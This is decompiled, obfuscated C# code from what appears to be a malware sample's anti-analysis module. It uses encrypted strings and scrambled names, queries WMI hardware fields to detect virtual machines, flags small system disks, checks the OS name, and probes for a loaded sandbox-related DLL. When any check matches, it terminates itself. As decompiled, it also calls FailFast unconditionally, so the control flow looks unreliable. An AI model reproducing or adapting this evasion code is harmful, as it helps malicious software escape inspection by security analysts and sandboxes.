using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.Devices;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace drXPuaQNZPOSPCS;

internal sealed class QPqYPKarfuYJdps
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void VKbzhJtoJKlOetQK()
	{
		if (ZevQtzvtbAYXQWo() || SLNRFxcThxS() || HHelFqQluNW() || pPgGIxkqpAUapG())
		{
			Process.GetCurrentProcess().Kill();
		}
		Environment.FailFast(null);
	}

	private static bool HHelFqQluNW()
	{
		try
		{
			if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= 61000000000L)
			{
				return true;
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool pPgGIxkqpAUapG()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (new ComputerInfo().get_OSFullName().ToLower().Contains(getString_0(107402496)))
			{
				return true;
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool ZevQtzvtbAYXQWo()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107402491));
			try
			{
				ManagementObjectCollection val2 = val.Get();
				try
				{
					ManagementObjectEnumerator enumerator = val2.GetEnumerator();
					try
					{
						while (enumerator.MoveNext())
						{
							ManagementBaseObject current = enumerator.get_Current();
							string text = current.get_Item(getString_0(107402474)).ToString()!.ToLower();
							if ((text == getString_0(107402425) && current.get_Item(getString_0(107402396)).ToString()!.ToUpperInvariant().Contains(getString_0(107402419))) || text.Contains(getString_0(107402886)) || current.get_Item(getString_0(107402396)).ToString() == getString_0(107402877))
							{
								return true;
							}
						}
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool SLNRFxcThxS()
	{
		try
		{
			if (GetModuleHandle(getString_0(107402892)).ToInt32() != 0)
			{
				return true;
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetModuleHandle(string string_0);

	static QPqYPKarfuYJdps()
	{
		Strings.CreateGetStringDelegate(typeof(QPqYPKarfuYJdps));
	}
}
